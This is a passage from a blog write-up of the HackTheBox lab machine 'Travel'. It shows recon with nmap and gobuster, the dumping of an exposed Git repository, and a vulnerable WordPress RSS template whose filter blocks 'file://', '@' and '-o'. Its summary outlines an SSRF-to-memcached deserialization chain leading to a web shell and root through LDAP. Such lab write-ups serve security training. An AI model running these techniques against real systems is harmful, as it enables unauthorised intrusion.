<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Travel just retired on HackTheBox. It’s a hard difficulty Linux box. The box was really well designed but it’s the one that gives me the biggest headache so far. The path to user is really not obvio">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Travel">
<meta property="og:url" content="https://hg8.sh/posts/travel/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Travel just retired on HackTheBox. It’s a hard difficulty Linux box. The box was really well designed but it’s the one that gives me the biggest headache so far. The path to user is really not obvio">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83274122-9a75cb00-a1cd-11ea-8e44-a3d1de73447c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83331082-1f2b1c80-a294-11ea-89cc-beecf347e724.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83331099-44b82600-a294-11ea-8106-7376cb873716.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83331292-87c6c900-a295-11ea-931f-0aea5b5461a1.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83331326-c52b5680-a295-11ea-9798-be3fd6689868.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83437662-69510100-a440-11ea-98a4-3d8ac8af6d79.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/83969018-80bf3c80-a8cd-11ea-8f14-e1ca4cf8ad92.jpg">
<meta property="article:published_time" content="2020-09-11T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.838Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="git">
<meta property="article:tag" content="memcached">
<meta property="article:tag" content="docker">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="ldap">
<meta property="article:tag" content="travel">
<meta property="article:tag" content="phpmemcached">
<meta property="article:tag" content="memcached injection">
<meta property="article:tag" content="Gopher">
<meta property="article:tag" content="deserialization">
<meta property="article:tag" content="simplePie">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/83274122-9a75cb00-a1cd-11ea-8e44-a3d1de73447c.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Travel :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/admirer/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/quick/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Repository-Disclosure"><span class="toc-number">1.2.</span> <span class="toc-text">Git Repository Disclosure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSS-Template"><span class="toc-number">1.3.</span> <span class="toc-text">RSS Template</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-SSRF-With-Custom-RSS-Feed"><span class="toc-number">1.4.</span> <span class="toc-text">Blind SSRF With Custom RSS Feed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug-php"><span class="toc-number">1.5.</span> <span class="toc-text">Debug.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-Deserialization-Vulnerability"><span class="toc-number">1.6.</span> <span class="toc-text">Object Deserialization Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimplePie-Memcached-Key"><span class="toc-number">1.7.</span> <span class="toc-text">SimplePie Memcached Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memcached-injection"><span class="toc-number">1.8.</span> <span class="toc-text">Memcached injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypassing-SSRF-protection"><span class="toc-number">1.8.1.</span> <span class="toc-text">Bypassing SSRF protection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Memcached-And-Gopher-Protocol"><span class="toc-number">1.8.2.</span> <span class="toc-text">Memcached And Gopher Protocol</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chaining-vulnerabilities-for-RCE"><span class="toc-number">1.9.</span> <span class="toc-text">Chaining vulnerabilities for RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upgrade-Web-Shell-with-Socat"><span class="toc-number">1.10.</span> <span class="toc-text">Upgrade Web-Shell with Socat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-lynik-admin"><span class="toc-number">1.11.</span> <span class="toc-text">Pivot www-data -&gt; lynik-admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Server"><span class="toc-number">2.2.</span> <span class="toc-text">LDAP Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Admin-Password"><span class="toc-number">2.3.</span> <span class="toc-text">LDAP Admin Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-User-privilege-escalation"><span class="toc-number">2.4.</span> <span class="toc-text">LDAP User privilege escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Travel
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-09-11T22:00:00.000Z" itemprop="datePublished">12-09-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      27 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="580" alt="travel-hackthebox" src="https://user-images.githubusercontent.com/9076747/83274122-9a75cb00-a1cd-11ea-8e44-a3d1de73447c.png">

<p>Travel just retired on HackTheBox. It’s a hard difficulty Linux box. The box was really well designed but it’s the one that gives me the biggest headache so far. The path to user is really not obvious and require a lot of enumeration and stepping back, looking at the big picture to understand what’s going on behind the hood and how it can be exploited. This box doesn’t rely on common vulnerabilities but rather on little configuration and coding mistakes that allows you to chain vulnerability until you can obtain what you need. In the end it’s a though but awesome box that I really recommend. </p>
<p><strong>Tl;Dr:</strong> To get the user flag you first have to retrieve some php files code source from an open <code>git</code> repository. With information found in the source code you discover an SSRF vulnerability and an object deserialization vulnerability through <code>memcached</code>. Linking those two vulnerabilities we achieve arbitrary file write allowing us to create a web-shell. The web server runs in a Docker container and we have to explore to find a SQL backup file containing hashed password for <code>lynik-admin</code> user. Cracking the hash allow to use password to connect through SSH and get the user flag.<br>For the root flag you have to find the LDAP admin password in <code>.viminfo</code> cache file. Using this admin password it’s possible, using LDAP, to edit the permission of one user on the box to give him <code>root</code> access trough sudo. It’s also possible to edit its SSH key and account password, giving us full access to a privileged account and use it to get the root flag.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.189 traval.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  nmap -sV -sT -sC travel.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> travel.htb (10.10.10.189)</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB</span><br><span class="line">443/tcp open  ssl/http nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB - SSL coming soon.</span><br><span class="line">| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK</span><br><span class="line">|_ Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.06 seconds</span><br></pre></td></tr></table></figure>

<p>We have a classical web app running on port 80, 443 and the SSH port 22 open.</p>
<p><code>nmap</code> gives us additional information about two subdomains: <code>blog.travel.htb</code> and <code>blog-dev.travel.htb</code>.</p>
<p>Opening <a target="_blank" rel="noopener" href="http://travel.htb/">http://travel.htb</a> display a following page:</p>
<img width="1012" alt="travel homepage" src="https://user-images.githubusercontent.com/9076747/83331082-1f2b1c80-a294-11ea-89cc-beecf347e724.png">

<p>Not much we can’t do from here… Let’s move on.</p>
<p>Opening <a target="_blank" rel="noopener" href="https://travel.htb/">https://travel.htb</a> display a following page:</p>
<img width="1012" alt="travel https homepage" src="https://user-images.githubusercontent.com/9076747/83331099-44b82600-a294-11ea-8106-7376cb873716.png">

<p>The port 443 seems quite empty aswell… Let’s take a look at the subdomains:</p>
<p>Opening <a target="_blank" rel="noopener" href="http://blog-dev.travel.htb/">http://blog-dev.travel.htb</a> returns a <code>403 Forbidden</code> while <a target="_blank" rel="noopener" href="http://blog.travel.htb/">http://blog.travel.htb</a> returns an actual blog:</p>
<img width="1012" alt="travel blog homepage" src="https://user-images.githubusercontent.com/9076747/83331292-87c6c900-a295-11ea-931f-0aea5b5461a1.png">

<p>The blog is a Wordpress (<code>Powered by WordPress </code> in the footer) and it main and only feature seems to be the “Awesome RSS” reader:</p>
<blockquote>
<p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p>
</blockquote>
<p>The page display an RSS Reader with apparently nothing in particular:</p>
<img width="1012" alt="travel RSS feature" src="https://user-images.githubusercontent.com/9076747/83331326-c52b5680-a295-11ea-9798-be3fd6689868.png">

<p>Let’s move on. First we can fire <code>gobuster</code> to see if it can find interesting directories. </p>
<p><code>http://blog.travel.htb</code> didn’t returned any interesting content, nothing more than common wordpress folder. <code>wpscan</code> didn’t find any vulnerability in the Wordpress version used nor in any plugins or themes.</p>
<h3 id="Git-Repository-Disclosure"><a href="#Git-Repository-Disclosure" class="headerlink" title="Git Repository Disclosure"></a>Git Repository Disclosure</h3><p>Upon running <code>gobuster</code> on <code>http://blog-dev.travel.htb</code> an interesting folder shows up:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://blog-dev.travel.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.git (Status: 301)</span><br></pre></td></tr></table></figure>

<p>Looks like someone accidentally let the project Git repository open and accessible. </p>
<p>If you are comfortable with Git inner-working, you are aware that Git will create a <code>.git</code> folder at the root of every projects it handle. This folder contains all the informations necessary for versioning the project, including all the information about commits, remote repository address, etc.<br>It also contains logs that stores the files commit history to be able to roll back to history at any moment.</p>
<p>Here is a good <a target="_blank" rel="noopener" href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">explanation</a> on how it works behind the hood.</p>
<p>Alright! So with the right <a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">tools</a> we should be able to easily dump the whole content of the repository.<br>Let’s use <code>GitTools</code> for this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-dump</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f</span><br><span class="line">[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9</span><br><span class="line">[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039</span><br><span class="line">[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da</span><br></pre></td></tr></table></figure>

<p>Bingo! looks like we managed to access a few files here. Let’s now run <code>git reset</code> to get the file content:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">log</span></span><br><span class="line">commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -&gt; master)</span><br><span class="line">Author: jane &lt;jane@travel.htb&gt;</span><br><span class="line">Date:   Tue Apr 21 01:34:54 2020 -0700</span><br><span class="line"></span><br><span class="line">    moved to git</span><br><span class="line">    </span><br><span class="line">[hg8@archbook ~]$ git reset --hard</span><br><span class="line">HEAD is now at 0313850 moved to git</span><br><span class="line">hugo@archpen:/home/hugo/hackthebox/travel/blog-dev-dump git:(master) $ ls</span><br><span class="line">README.md  rss_template.php  template.php</span><br></pre></td></tr></table></figure>

<p>According to the <code>README.md</code> file this is an extension to show RSS inside a Wordpress page:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat README.md</span><br><span class="line"><span class="comment"># Rss Template Extension</span></span><br><span class="line"></span><br><span class="line">Allows rss-feeds to be shown on a custom wordpress page.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Setup</span></span><br><span class="line"></span><br><span class="line">\ `git <span class="built_in">clone</span> https://github.com/WordPress/WordPress.git`</span><br><span class="line">* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`</span><br><span class="line">* create logs directory <span class="keyword">in</span> `wp-content/themes/twentytwenty`</span><br><span class="line">* create page <span class="keyword">in</span> backend and choose rss_template.php as theme</span><br><span class="line"></span><br><span class="line"><span class="comment">## Changelog</span></span><br><span class="line"></span><br><span class="line">- temporarily disabled cache compression</span><br><span class="line">- added additional security checks</span><br><span class="line">- added caching</span><br><span class="line">- added rss template</span><br><span class="line"></span><br><span class="line"><span class="comment">## ToDo</span></span><br><span class="line"></span><br><span class="line">- finish logging implementation% </span><br></pre></td></tr></table></figure>

<p>This is probably what is being used on the “Awesome RSS” page we found earlier on <code>http://blog.travel.htb/awesone-rss/</code>.</p>
<p>The <code>README.md</code> gives us additional information that might come useful later:</p>
<ul>
<li><code>rss_template.php</code> and <code>template.php</code> files we just found should be located in <code>wp-content/themes/twentytwenty</code>.</li>
<li>A <code>logs</code> folder exist at <code>wp-content/themes/twentytwenty/logs</code>.</li>
<li>The RSS have security checks, probably meaning it handle user input at some points.</li>
<li>Something get cached somewhere.</li>
</ul>
<p>With those information in mind let’s continue our investigations.</p>
<h3 id="RSS-Template"><a href="#RSS-Template" class="headerlink" title="RSS Template"></a>RSS Template</h3><p>Let’s take a deeper look at the two php files we recovered. First <code>rss_template.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Template Name: Awesome RSS</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;template.php&#x27;</span>);</span><br><span class="line">get_header();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;main <span class="class"><span class="keyword">class</span>=&quot;<span class="title">section</span>-<span class="title">inner</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"> <span class="title">function</span> <span class="title">get_feed</span>($<span class="title">url</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;/wp-includes/class-simplepie.php&#x27;</span>;</span><br><span class="line">     <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">     <span class="variable">$data</span> = url_get_contents(<span class="variable">$url</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$url</span>) &#123;</span><br><span class="line">         <span class="variable">$simplepie</span> = <span class="keyword">new</span> SimplePie();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br><span class="line">         <span class="comment">//$simplepie-&gt;set_raw_data($data);</span></span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_feed_url(<span class="variable">$url</span>);</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;init();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;handle_content_type();</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$simplepie</span>-&gt;error) &#123;</span><br><span class="line">             error_log(<span class="variable">$simplepie</span>-&gt;error);</span><br><span class="line">             <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">             <span class="variable">$failed</span> = <span class="literal">True</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$simplepie</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span>(strpos(<span class="variable">$url</span>, <span class="string">&quot;custom_feed_url&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="variable">$tmp</span> = (explode(<span class="string">&quot;=&quot;</span>, <span class="variable">$url</span>));</span><br><span class="line">          <span class="variable">$url</span> = end(<span class="variable">$tmp</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$url</span> = <span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$feed</span> = get_feed(<span class="variable">$url</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/main&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">DEBUG</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;debug.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> get_template_part( <span class="string">&#x27;template-parts/footer-menus-widgets&#x27;</span> ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">get_footer();</span><br></pre></td></tr></table></figure>

<p>Alright so this file gives us a lot of informations on what going on. To resume:</p>
<ul>
<li>This is the template used at <code>http://blog.travel.htb/awesome-rss/</code>.</li>
<li>The RSS is parsed using a library named <code>SimplePie</code>.</li>
<li>Something seems to be cached (probably the feed content?) into a local instance of <code>memcached</code>.</li>
<li>It’s possible to provide a custom RSS feed link to the page using <code>custom_feed_url</code> parameter.</li>
<li>There is a <code>debug.php</code> file located at <code>wp-content/themes/twentytwenty/debug.php</code></li>
</ul>
<p>Let’s now take a look at <code>template.php</code> which get included in <code>rss_template.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> <span class="doctag">Todo:</span> finish logging implementation via TemplateHelper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// this should be secure</span></span><br><span class="line">        <span class="variable">$tmpUrl</span> = urldecode(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;file://&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;@&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-o&quot;</span>) !== <span class="literal">false</span> 